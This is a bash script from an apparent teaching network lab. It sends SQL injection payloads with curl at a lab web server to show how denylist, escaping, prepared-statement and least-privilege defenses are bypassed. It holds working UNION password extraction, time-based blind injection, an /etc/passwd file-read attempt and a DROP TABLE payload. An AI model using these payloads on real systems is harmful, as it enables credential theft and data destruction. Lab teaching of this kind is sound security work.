#!/bin/bash
# Cardinal — SERVER-SIDE defenses (Tiers 1-3) and documented attacks that bypass
# them. Unlike client-side, curl does NOT skip these (every request hits the
# server), so the bypass is a PAYLOAD evasion, not "leave the browser".
#
# Toggles on /search:
#   ?serversan=denylist|escape|allowlist   Tier 1 input sanitization
#   ?id=<expr>   numeric-context filter (escape blind spot)
#   ?impl=param&sort=<col>   Tier 2 ORDER BY identifier injection
#   ?impl=proc   Tier 2 stored-procedure dynamic SQL
#
# Run:  kathara connect attacker ; /scripts/server_bypass.sh
set -u
P="http://172.30.0.10"
run(){ curl -s -G "$P/search" "$@"; }
leaked(){ grep -q alicepw && echo "  => creds LEAKED" || echo "  => blocked"; }
nrows(){ grep -oc '/records/'; }
UN="id,username,password,display_name,title,department,status FROM users WHERE username LIKE '"

echo "############ TIER 1 — input sanitization (documented bypass each) ############"
echo "[denylist] plain UNION (keywords stripped):"
run --data-urlencode 'serversan=denylist' --data-urlencode "q=zzz' UNION SELECT $UN" | leaked
echo "[denylist] self-nested UNUNIONION SESELECTLECT (re-forms after single-pass strip):"
run --data-urlencode 'serversan=denylist' --data-urlencode "q=zzz' UNUNIONION SESELECTLECT $UN" | leaked
echo -n "[escape] string ' OR '1'='1 (quotes doubled)      -> rows: "; run --data-urlencode 'serversan=escape' --data-urlencode "q=' OR '1'='1" | nrows
echo -n "[escape] numeric ?id=0 OR 1=1 (no quote to escape) -> rows: "; run --data-urlencode 'serversan=escape' --data-urlencode 'id=0 OR 1=1' | nrows
echo "[escape] numeric-context UNION:"
run --data-urlencode 'serversan=escape' --data-urlencode 'id=0 UNION SELECT id,username,password,display_name,title,department,status FROM users' | leaked
echo -n "[allowlist] injection -> "; run --data-urlencode 'serversan=allowlist' --data-urlencode "q=' OR '1'='1" | grep -q rejected && echo "REJECTED (allowlist holds; documented bypass is second-order)" || echo "allowed"

echo
echo "############ TIER 2 — holes in 'we use prepared statements' ############"
echo "[ORDER BY injection] value is parameterized, sort column is concatenated:"
echo -n "   conditional time, alice pw[1]='a'? -> "; run --data-urlencode 'impl=param' --data-urlencode "sort=(SELECT SLEEP(3) FROM users WHERE username=0x616c696365 AND SUBSTRING(password,1,1)=0x61)" -o /dev/null -w 'time %{time_total}s (3s = TRUE)\n'
echo -n "   conditional time, alice pw[1]='z'? -> "; run --data-urlencode 'impl=param' --data-urlencode "sort=(SELECT SLEEP(3) FROM users WHERE username=0x616c696365 AND SUBSTRING(password,1,1)=0x7a)" -o /dev/null -w 'time %{time_total}s (fast = FALSE)\n'
echo "[stored procedure] builds dynamic SQL from its parameter:"
run --data-urlencode 'impl=proc' --data-urlencode "q=zzz' UNION SELECT $UN" | leaked

echo
echo "############ TIER 3 — hardening limits damage, does NOT stop extraction ############"
echo -n "[least-priv] LOAD_FILE('/etc/passwd') -> "; run --data-urlencode 'impl=concat' --data-urlencode "q=zzz' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5,6,7-- -" | grep -q alicepw && echo "n/a" || echo "NULL (file read blocked)"
echo "[least-priv] ...but UNION on app tables still extracts:"
run --data-urlencode 'impl=concat' --data-urlencode "q=zzz' UNION SELECT $UN" | leaked
echo -n "[hidden errors] error-based payload -> "; run --data-urlencode 'impl=concat' --data-urlencode "q=' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -" -o /dev/null -w 'HTTP %{http_code} (no error text leaked)\n'
echo -n "[no stacked] '; DROP TABLE comments -> "; run --data-urlencode 'impl=concat' --data-urlencode "q=zzz'; DROP TABLE comments-- -" -o /dev/null -w 'HTTP %{http_code} (rejected, table intact)\n'

echo
echo "[*] Only PARAMETERIZATION (?impl=param, applied to the injectable part) and"
echo "    structural detection actually hold — because SQLi is a structural attack."
